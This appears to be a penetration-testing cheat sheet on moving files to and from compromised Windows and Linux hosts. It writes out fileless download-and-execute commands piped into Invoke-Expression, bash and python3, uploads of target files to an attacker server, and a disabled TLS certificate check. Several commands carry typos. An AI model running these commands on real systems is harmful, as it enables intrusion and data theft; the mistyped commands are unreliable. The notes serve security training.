## Windows File Transfer Methods

### Download Operations

#### PowerShell Base64 Encode & Decode

depending on the file size a file can be transmitted through a base64 encoded string to be decoded in the target machine, the contents can then be verified using a md5 hash of the file

##### on Linux:

> encoding file:
	cat [file] | base64 -w 0


>verifying file integrity:
	md5sum [b64encoded.file]

> writing to file from base64 string:
	echo -n '[base64-string]' | base64 -d -w 0 > [file]

##### on Windows:

> encoding file:
	 [Convert]::ToBase64String((Get-Content -Path [path-to-file] -Encoding byte))

> verifying file integrity:
	Get-FileHash -Path [path-to-file] -Algortihm MD5

> writing to file from base64 string:
	[IO.File]::WriteAllBytes("[path-to-file]", [Convert]::FromBase64String("[base64-string]"))

<br>

#### PowerShell Web Downloads

the SYstem.Net.WebClient class can be used to download resources over HTTP, HTTPS or FTP [the listed methods also have an Async option]:

- OpenRead: returns data as a stream
- DownloadData: returns data as a byte array
- DownloadFile: download file
- DownloadString: returns a string 

##### DownloadFile

	(New-Object System.Net.WebClient).DownloadFile('[file-url]','[output-file]')

##### DownloadString (Fileless Method)

	Invoke-Expression (New-Object System.Net.WebClient).DownloadString('[file-url]')

	(New-Object System.Net.WebClient).DownloadString('[file-url]') | Invoke-Expression

##### Invoke-WebRequest
	Invoke-WebRequest [file-url] -OutFile [outfile-name]

if there is a SSL/TLS error you can bypass it by issuing 

	[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

<br>

#### SMB Downloads

utilizing a python script (such as impacket's smbserver.py) it is possible to host a simple ftp server on the attacking machine to retrieve files from a windows target

##### on attacking machine:

	python3 smbserver.py shareName sharePath

##### on windows host:
	copy-item \\[attacking-ip]\[shareName]\[file]


windows might block unauthenticated smb connections, in that case:

##### on attacking machine:

	 python3 smbserver.py -user [user] -password [password] shareName sharePath

##### on windows host:

	net use [drive-letter:] \\[attacking-ip]\[shareName] /user:'user' 'password'

###### to remove a mounted share:

	net use [drive-letter] /DELETE

<br>

#### FTP Downloads

**pyftpdlib** can be used to host a simple FTP server similar to http.server 

	pip3 install pyftpdlib

	python3 -m pyftpdlib

a web request can then be made using *Invoke-WebRequest*  with a ftp:// url or a ftp command file can be written on the windows host:

	echo open [ftp-server-ip] > ftpcommand.txt
	echo USER anonymous >> ftpcommand.txt
	echo binary >> ftpcommand.txt
	echo GET [file] [output-file]>> ftpcommand.txt
	echo bye >> ftpcommand.txt
	ftp -v -n -s:ftpcommand.txt

### Upload Operations

the same base64 techniques used for download allow the upload of files [depending on their file size]

##### on windows host:
	[Convert]::ToBase64String((Get-Content -Path [file-path] -Encoding byte))

#### PowerShell Web Uploads:

an upload server can be created using *uploadserver*, an extended module of the python http.server module

	 pip3 install uploadserver

	python3 -m uploadserver

files can then be uploaded to http://[server-address]/upload

PSUpload.ps1 is a script which allows PowerShell uploads based on the *Invoke-WebRequest* cmdlet, the cmdlet *Invoke-FileUpload* accepts the parameters *-File* and *-Uri*

##### install *Invoke-FileUpload*:
	 Invoke-Expression(New-Object System.Net.WebClient).DownloadString('http://[attacking-machine]/PSUpload.ps1')

##### upload file to server:
	 Invoke-FileUpload -File [file] -Uri http://[attacking-server]/upload

#### PowerShell Base64 Web Upload

it is also possible to upload a base64 encoded file by making a request to a listener in the attacking machine:

##### on windows host:
	$b64 = [System.convert]::ToBase64String((Get-Content -Path '[file]' -Encoding Byte))
	Invoke-WebRequest -Uri [server-ip] -Method POST -Body $b64

##### on attacking machine:
	nc -lvnp 8000

#### SMB Uploads

smb traffic to outside networks is usually blocked, an alternative to this is using SMB over HTTP with WebDAV (an extension of the HTTP protocol that allows it to behave like a file server)

if a connection is made using SMB and a share isn't available it will then try to connect using HTTP

#### configuring a WebDAV server:
	pip 3 install wsgidav cheroot
	wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous

#### on windows host:
	dir \\[server-ip]\DavWWWRoot
	copy [file] \\[server-ip]\DavWWWRoot
	copy [file] \\[server-ip]\[shareName]

[DavWWWRoot is a special keyword recognized by the windows shell, no such folder exists, it will make you connect to the root of the WebDAV server]

if no smb restrictions are in place, upload can be achieved by the same methods listed in *SMB Downloads*

#### FTP Uploads

pyftpdlib can be used with the *--write* option to allow uploads, then this cmdlet can then be used for upload:

	(New-Object System.Net.WebClient).UploadFile('ftp://[server-ip]/[remote-filename]', '[local-file]') 

<br>

## Linux File Transfer Methods

### Download Operations

#### Base64 Encode & Decode

	cat [file] | base64 -w 0

	 echo -n '[base64-string]' | base64 -d -w 0

#### Web Downloads with Wget and cURL

	 wget http://[url]/[file] -O [output-filename]

	curl -o [output-filename] http://[url]

#### Fileless Attacks Using Linux

##### curl:
	 curl http://[url]/[file] | bash
	 curl http://[url]/[python-script-file] | python3

##### wget:
	 wget -q0- http://[url]/[file] | bash
	  wget -q0- http://[url]/[python-script-file] | python3 


#### SCP Downloads

if ssh credentials compromise is achieved scp can be used to transfer files between machines

	scp [file] [compromised-user]@[address]:[path]
[the user should have write permissions over the [path] directory] 
<br>

## Transfering Files with Code

### Python

#### Downloading

##### python3

	python3 -c 'import urllib.request;urllib.request.urlretrieve("http://[server-ip]/[file]","[output-file]")'

##### python2.7

	python2.7 -c 'import urllib;urrlib.urlretrieve("http://[server-ip]/[file]","[output-file]")'
<br>

#### Uploading

##### listen on the attacking machine:

	python3 -m uploadserver 80

##### upload file to server:

	python3 -c 'import requests;r = requests.post("http://[server-ip]/upload",files={"files":open("[filepath]","rb")})'
<br>

### PHP

php -r '$file = file_get_contents("http://[server-ip]/[file]");file_put_contents("[output-filename]",\$file)'
<br>

## Miscellaneous File Transfer Methods

### File Transfer with Ncat

ncat is the new and improved version of netcat (nc command)

listening/sending machine will vary based on factors such as filters on outbound connections etc

#### on listening:

	ncat -l -p [port] [--recv-only]> [output_file]

#### on sending:

	ncat [listening-address] [port] [--send-only] < [input-file]

#### sending file as input to ncat:

	ncat -l -p [port] [--recv-only] < [input-file]
[the connecting machine will receive the content as soon as connection is made]

<br>

### PowerShell Session File Transfer

in case HTTP, HTTPS and SMB are unavailable **PowerShell Remoting** can be used to perform file transfer operations

PowerShell Remoting allows for execution of scripts/commands on a remote computer using ***sessions***, ports TCP/5985 (HTTP) and TCP/5986 (HTTPS) are used

to create a ***session*** on a remote host administrative access, membership on the Remote Management Users or explicit permissions for PowerShell Remoting mus be set

#### checking for remoting permissions:

[DOMAIN\\Administrator on Host1]
	Test-NetConnection -ComputerName [Host2] -Port 5985


#### creating a new session to Host2:

[DOMAIN\\Administrator on Host1]
	$session = New-PSSession -ComputerName [Host2]

#### copying file from Host1 to Host2 using session:

[DOMAIN\\Administrator on Host1]
	Copy-Item -Path [source-filepath-on-host1] -ToSession $session -Destination [destination-filepath-on-host2]

#### copying file from remote host using session:

[DOMAIN\\Administrator on Host1]
	Copy-Item -Path [source-filepath-on-host2] -Destination [destination-filepath-on-host1] -FromSession $session

<br>

### RDP

copy and pasting can usually be used on RDP for transfering files, a local resource can be mounted as a network share in a remote RDP session 

#### mounting share on remote RDP session:

	xfreerdp /v:[remote-ip] /d:[domain] /u:[username] /p:[password] /drive:[drive-name],[local-path]

<br>

## Protected File Transfers

whenever sensitive data needs to be transported during an assessment, it should then be encrypted 

### File Encryption on Windows

scripts such as Invoke-AESEncryption.ps1 can be used to allow for symmetric encryption of files, a strong unique password should be used in every different assessment 

### File Encryption on Linux

openssl is usually included in linux distributions and can be used to encrypt files

#### encrypting a file using aes256 :

	openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc

#### descrypting an aes256 encrypted file:

	openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
[a prompt would then ask for the password that was used to encrypt the file]

<br>









## Catching Files over HTTP/S

aside from a simple http server using python and the http.server module it is also possible to setup an nginx/apache server to catch file transfers

nginx is recommended due to having less overhead and also the module system in apache introducing some security concerns

#### setting up an upload directory in nginx:

	sudo mkdir -p /var/www/html/uploads/secretUploadDir/
	sudo chwon -R /var/www/uploads/secretUploadDir/
	nano /etc/nginx/sites-available/upload-dir.conf /*
	//configuration file for upload dir
		server{
		listen 9001;
		location /secretUploadDir/ {
		root /var/www/html/uploads;
		dav_methods PUT;
		}} 
		*/
	sudo ln -s /etc/nginx/sites-available/upload-dir.conf /etc/nginx/sites-enabled/
	sudo systemctl restart nginx.service
	[if port 80 is already in use, remove default configuration file: sudo rm /etc/nginx/sites-enabled/default]

#### upload file using curl:

	curl -T [file] http://[server-ip]:9001/secretUploadDir/[destination-filename]

#### upload file using *Invoke-WebRequest* cmdlet:

	Invoke-WebRequest -Uri http://[server-ip]:[port]/[path]/[destination-filename] -Method Put -InFile [input-file]

<br>



## Living off The Land

LOLBAS and GTFOBins are tools to search for native binaries that can be used to escalate privileges, transfer files and many other things on Linux and Windows hosts

### setup https server with openssl to transfer files:

#### create certificate:
	openssl req -newkey rsa:2048 -nodes -keyout [key-name] -x509 -days 365 -out [certificate-name]

#### stand up server in attacking machine:
	openssl s_server -quiet -accept 80 -cert [certificate-name] -key [key-name] < [input file]

#### download file on target machine:
	openssl s_client -connect [server-ip] -quiet > [output-file]

<br>

